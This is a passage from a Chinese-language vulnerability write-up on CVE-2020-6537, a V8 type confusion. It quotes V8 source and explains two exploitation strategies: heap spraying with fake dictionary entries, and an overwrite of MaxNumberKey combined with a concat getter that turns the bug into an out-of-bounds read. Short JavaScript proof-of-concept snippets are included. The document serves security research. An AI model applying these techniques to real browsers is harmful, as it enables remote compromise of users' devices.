              this.object, this.offset + index * %SizeOf());
        } else {
          goto OutOfBounds;
        }
      }
      // ...
    }
这会最终执行到’unreachable code’，然后导致进程崩溃。因此，我们必须考虑其他方式。
另外的一个限制在于，越界写入的数据内容并不是我们可以控制的，它总是一个JSObject的地址，这个object生成于代码 [2] 处，例如：
_{status: “fulfilled”, value: 1}_ 。
### The NumberDictionary
我们虽然能造成FixedArray与NumberDictionary之间的类型混淆，但是只能往NumberDictionary的范围内写入受限的内容。那么NumberDictionary中有什么内容是值得被写的呢？
首先来看一下FixedArray与NumberDictionary的内存结构对比：
可以看到，NumberDictionary有着更多的metadata
fields。`Capacity`代表了NumberDictionary所能保存的最大entry数量，看上去是一个比较有价值的目标。通过将其修改为一个JSObject的地址（通常是一个很大的值），我们就得到一个畸形的JSArray，并利用其中的NumberDictionary造成越界读写。然而，通过这种方式进行的越界访问偏移值却是不可预测的。
我们通过向普通NumberDictionary中写入一次数据为例：
    let arr = [];
    arr[0x10000] = 0x42;
为了写入key-value，V8需要确定两件事情。
  1. 当前NumberDictionary中是否已经存在以key为索引的entry，如果存在，则只需更新该entry即可
  2. 如果不存在对应entry，则可以使用一个空entry，或者新增entry
这个过程是通过`FindEntry`来完成的。
    // v8/src/objects/hash-table-inl.h
    // Find entry for key otherwise return kNotFound.
    template 
    InternalIndex HashTable::FindEntry(IsolateRoot isolate,
                                                       ReadOnlyRoots roots, Key key,
                                                       int32_t hash) {
      uint32_t capacity = Capacity();
      uint32_t count = 1;
      Object undefined = roots.undefined_value();
      Object the_hole = roots.the_hole_value();
      USE(the_hole);
      // EnsureCapacity will guarantee the hash table is never full.
      for (InternalIndex entry = FirstProbe(hash, capacity);;
           entry = NextProbe(entry, count++, capacity)) {
        Object element = KeyAt(isolate, entry);
        // Empty entry. Uses raw unchecked accessors because it is called by the
        // string table during bootstrapping.
        if (element == undefined) return InternalIndex::NotFound();
        if (Shape::kMatchNeedsHoleCheck && element == the_hole) continue;
        if (Shape::IsMatch(key, element)) return entry;
      }
    }
    // v8/src/objects/hash-table.h
    inline static InternalIndex FirstProbe(uint32_t hash, uint32_t size) {
      return InternalIndex(hash & (size - 1));
    }
    inline static InternalIndex NextProbe(InternalIndex last, uint32_t number,
                                          uint32_t size) {
      return InternalIndex((last.as_uint32() + number) & (size - 1));
    }
    // v8/src/objects/dictionary-inl.h
    uint32_t NumberDictionaryBaseShape::Hash(ReadOnlyRoots roots, uint32_t key) {
      return ComputeSeededHash(key, HashSeed(roots));
    }
函数调用了`FirstProbe` 来决定从何处开始搜索key。假设`FirstProbe` 返回了 _i_ ，且偏移为 _i_
的entry不符合条件，那么V8将会调用`NextProbe` 来获得下一个偏移。这个尝试偏移的序列为： _i_ , _i + 1_ , _i + 1 +
2_ , _i + 1 + 2 + 3_ …
`FirstProbe`接受2个参数，`size`代表NumberDictionary的容量，即我们覆写的Capacity字段，`hash`
则由`NumberDictionaryBaseShape::Hash`计算而来。不幸的是，`hash`
并不是可预测的，因为V8使用了一个Int64长度的随机值作为种子。
因此如果我们通过覆写Capacity，以此来触发越界，那么计算出来的偏移将可能是 _[0, capacity – 1]_ 范围内的任意值。
### Strategy 1
既然我们不能控制越界的偏移，那么是否能利用堆喷来让越界访问变得“有意义”？
正常而言，在32位环境下的堆喷比64位更稳定，因为64位环境下的地址空间实在是太大了。但是在V8堆上，情况可能有所不同。目前64位下的V8开启了名为[指针压缩](https://v8.dev/blog/pointer-compression)的配置，确保所有的V8对象都分配在一个4GB大小的空间中。这个配置反而让64位环境下的堆喷存在一定可能。
我们继续来分析NumberDictionary的元素存取方式。前文说到了，将一个key-value对保存在dictionary
array中时，V8需要在NumberDictionary中寻找到合适的entry。`IsMatch`
函数负责检查当前的key是否等于entry中保存的key。
    // v8/src/objects/dictionary-inl.h
    bool NumberDictionaryBaseShape::IsMatch(uint32_t key, Object other) {
      DCHECK(other.IsNumber());
      return key == static_cast(other.Number());
    }
    // v8/src/objects/objects-inl.h
    double Object::Number() const {
      DCHECK(IsNumber());
      return IsSmi() ? static_cast(Smi(this->ptr()).value())
                     : HeapNumber::unchecked_cast(*this).value();
    }
如果entry中保存的key不是一个`Smi`，V8则会直接将其当作`HeapNumber`，然后把它的值转为`uint32_t`类型。这也可以理解为一次类型混淆，因为在触发越界访问时，位于越界堆上的数据可能为任意object。一旦V8在越界堆上找到了所谓“正确的”entry，它将往这个entry的value
field中写入一个可控的值。因此，我们可以大量的在堆上伪造entry，然后触发一次越界写，让V8往我们想要的地方写入值，从而造成影响更大的内存破坏。下面是我们采取的方式：
  1. 使用JSObject _`obj`_ 进行堆喷。
  2. 触发一次越界写，让V8将 _`obj.properties`_ 当作 _`dictionary_entry.key`_ ，将 _`obj.elements`_ 当作 _`dictionary_entry.value`_ 。因此V8将向 _`obj.elements`_ 写入我们控制的值。在这里我们选择的是写入一个double JSArray _`array`_ 。这会造成FixedArray（ _`obj.elements`_ ）和JSArray（ _`array`_ ）之间的类型混淆。
  3. 现在，类似 _obj[idx] = value_ 的代码将会直接修改 _`array`_ 的内存，例如修改其length。
  4. 利用这个length被修改的JSArray，达到任意地址读写的目标就很容易了。
下面的图片展示了在堆喷之后的内存布局：
举例来看，我们的目标是让V8将0x21e60bedc760处的内存当作一个dictionary entry，同时让V8认为它找到了正确的entry。Fake
entry中的 `Key` field实际上是某个JSObject的 `Properties`
field。V8会将其视作一个`HeapNumber`，然后把它的value转换为`uint32_t`类型。在这里例子中，转换后的值是3。因此我们只需要执行`confused_array[3]
= xxx`，即可让V8覆写Fake entry的 `Value` field。
到这里可能有人会产生一个疑惑，既然越界访问的偏移是随机的，那么如果V8没有访问到上面描述的那个Fake
entry怎么办？实际上，我们可以通过利用V8寻找entry的特性以及合理控制堆喷的内容来解决这个问题：
  1. 前文已经介绍过，当entry不符合要求时，V8会利用next probe计算下一次访问的偏移。这就像堆喷中的nop sled一样，保证了访问entry这个操作会持续不断进行。
  2. 由于指针压缩特性，V8的堆只有4GB大小，完全可以在一个可接受的时间内完成堆喷。
完成这一步之后，实现任意地址读写就是一件很简单的事情了。目前已有很多优秀的资料介绍了相关内容，在这里不再赘述。
### Strategy 2
上述利用思路存在着一些缺点：
  * 它不是一个100%成功率的方案
  * 它无法在32位环境中使用
而当时Pixel 4上的Chrome是32位的，意味着并不能满足要求。在之后的几周时间，我们找到了新的利用思路。
重新回顾这张对比图：
除了修改Capacity之外，是否有其他更好的选择？经过研究我们发现，MaxNumberKey这个字段有着非常特殊的含义。MaxNumberKey代表了这个数组中保存的所有元素的最大索引值，同时，其最低有效位表明了数组中是否存在特殊元素，例如accessors。以如下代码为例，我们可以在数组上定义一个getter：
    let arr = []
    arr[0x10000] = 1
    Object.defineProperty(arr, 0, {
      get : () => {
        console.log("getter called")
        return 1
      }
    }) 
此时，MaxNumberKey最低有效位为0，代表存在特殊元素。但是通过漏洞，我们可以将其覆写为一个JSObject的地址，而在V8中，任何HeapObject地址的最低位，恰好为1。即经过覆写的数组，即使上面定义了特殊元素，V8也会认为它不再特殊。
接下来，我们需要寻找能够充分利用这一影响的代码，在这里我们选择了Array.prototype.concat函数。该函数会调用至`IterateElements`，用于迭代被连接的数组。
    bool IterateElements(Isolate* isolate, Handle receiver,
                         ArrayConcatVisitor* visitor) {
      /* skip */
      if (!visitor->has_simple_elements() ||
          !HasOnlySimpleElements(isolate, *receiver)) {// ---> [6]
        return IterateElementsSlow(isolate, receiver, length, visitor);
      }
      /* skip */
      FOR_WITH_HANDLE_SCOPE(isolate, int, j = 0, j, j  element_value(elements->get(j), isolate);// ---> [7]
        if (!element_value->IsTheHole(isolate)) {
          if (!visitor->visit(j, element_value)) return false;
        } else {
          Maybe maybe = JSReceiver::HasElement(array, j);
          if (maybe.IsNothing()) return false;
          if (maybe.FromJust()) {
            ASSIGN_RETURN_ON_EXCEPTION_VALUE(isolate, element_value,
                JSReceiver::GetElement(isolate, array, j), false);// ---> [8]
            if (!visitor->visit(j, element_value)) return false;
          }
        }
      });
    /* skip */
    } 
在代码[6]处，V8检查了数组是否含有特殊元素，我们通过覆写MaxNumberKey，可以绕过这一检查，让函数进入后续的快速遍历路径。在代码[8]处，GetElement将触发accessor，执行自定义的js代码，从而有机会将数组的长度改为一个更小的值。随着遍历循环中的索引不断增大，最终在代码[7]处，会发生越界读。
    var arr; // 假设arr是一个类型混淆后的数组
    var victim_arr = new Array(0x200);
    Object.defineProperty(arr, 0, {
      get : () => {
        print("=== getter called ===");
        victim_arr.length = 0x10;   // 在回调函数中修改数组长度
        gc();
        return 1;
      }
    });
    // 越界读
    arr.concat(victim_arr);
通过上述方案，我们将原本的类型混淆，转换成了另一处越界读问题。利用越界读，我们就拥有了fake obj的能力，进而也可以轻松实现任意地址读写了。
## Conclusion
本文对CVE-2020-6537的成因进行了分析，并介绍了两种利用思路。这个漏洞是我们远程ROOT Pixel
4利用链中的一环，在后面的系列文章中，我们将会对利用链中的提权漏洞进行详细介绍。
* * *